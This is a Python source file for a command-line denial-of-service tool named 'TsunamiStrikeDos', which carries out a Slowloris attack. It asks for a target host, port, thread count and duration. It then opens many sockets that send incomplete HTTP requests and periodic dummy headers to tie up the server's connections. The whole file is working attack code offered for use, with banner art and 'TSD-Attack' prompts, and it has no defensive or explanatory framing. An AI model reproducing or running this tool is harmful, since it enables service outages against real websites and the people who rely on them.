import random
import socket
import threading
from faker import Faker
from colorama import Fore
import time

# Initialize Faker
fake = Faker()
__version__ = '5.0'
__method__ = 'SLOWLORIS'
#  
# --------------------------------------


print(f'''
{Fore.WHITE} TSD TOOL {Fore.GREEN} |{Fore.WHITE} Slowloris {Fore.GREEN} |{Fore.WHITE} BY ALM7MDY
{Fore.GREEN}
▄▄▄█████▓  ██████ ▓█████▄ 
▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
▒ ▓██░ ▒░░ ▓██▄   ░██   █▌
░ ▓██▓ ░   ▒   ██▒░▓█▄   ▌
  ▒██▒ ░ ▒██████▒▒░▒████▓ 
  ▒ ░░   ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ 
    ░    ░ ░▒  ░ ░ ░ ▒  ▒ 
  ░      ░  ░  ░   ░ ░  ░ 
               ░     ░    
                   ░      

                {Fore.CYAN} TsunamiStrikeDos V{Fore.GREEN} {__version__}{Fore.RESET}

''')
print('_'*40)
# Get random user agent
def random_useragent():
    return fake.user_agent()

# Init socket
def create_socket(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target[0], target[1]))

        sock.send(
            "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
        )
        sock.send(
            "User-Agent: {}\r\n".format(random_useragent()).encode("utf-8")
        )
        sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    except socket.timeout:
        print(f"{Fore.RED}( FALIED ) {Fore.MAGENTA}Timed out..{Fore.RESET}")
    except socket.error:
        print(f"{Fore.RED}( FAILED ) {Fore.MAGENTA}Failed to create socket !! {Fore.RESET}")
    else:
        print(f"{Fore.GREEN}( OK ) {Fore.WHITE}Socket created! {Fore.RESET}")
        return sock

def flood(target):
    # Create sockets
    sockets = []
    for _ in range(random.randint(20, 100)):
        sock = create_socket(target)
        if not sock:
            continue
        sockets.append(sock)

    # Send keep-alive headers
    for _ in range(4):
        for index, sock in enumerate(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                print(
                    f"{Fore.RED}[-] {Fore.MAGENTA}Failed to send keep-alive headers{Fore.RESET}"
                )
                sockets.remove(sock)
            else:
                print(
                    f"{Fore.GREEN}[+] {Fore.YELLOW}Sending keep-alive headers to {'{}:{}'.format(*target)} from socket {index + 1}. {Fore.RESET}"
                )

def thread_function(target):
    flood(target)

def main(target, thread_count, duration, sleeptime):
    stoptime = time.time() + duration
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=thread_function, args=(target,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
    
    while time.time() < stoptime:
        time.sleep(sleeptime)

    print(f'{Fore.GREEN} ( Done ) finish attack.')

if __name__ == "__main__":
    target_host = input(f'''\n{Fore.CYAN}┌─({Fore.GREEN}TSD-Attack{Fore.CYAN})─({Fore.YELLOW}~ Target Host{Fore.CYAN})
└──╼ {Fore.YELLOW}~: {Fore.GREEN}''')
    target_port = int(input(f'''\n{Fore.CYAN}┌─({Fore.GREEN}TSD-Attack{Fore.CYAN})─({Fore.YELLOW}~ Target Port{Fore.CYAN})
└──╼ {Fore.YELLOW}~: {Fore.GREEN}'''))
    num_threads = int(input(f'''\n{Fore.CYAN}┌─({Fore.GREEN}TSD-Attack{Fore.CYAN})─({Fore.YELLOW}~ Threads{Fore.CYAN})
└──╼ {Fore.YELLOW}~: {Fore.GREEN}'''))
    duration = int(input(f'''\n{Fore.CYAN}┌─({Fore.GREEN}TSD-Attack{Fore.CYAN})─({Fore.YELLOW}~ Time Attack{Fore.CYAN})
└──╼ {Fore.YELLOW}~: {Fore.GREEN}'''))
    sleeptime = int(input(f'''\n{Fore.CYAN}┌─({Fore.GREEN}TSD-Attack{Fore.CYAN})─({Fore.YELLOW}~ Sleep Time{Fore.CYAN})
└──╼ {Fore.YELLOW}~: {Fore.GREEN}'''))

    main((target_host, target_port), num_threads, duration, sleeptime)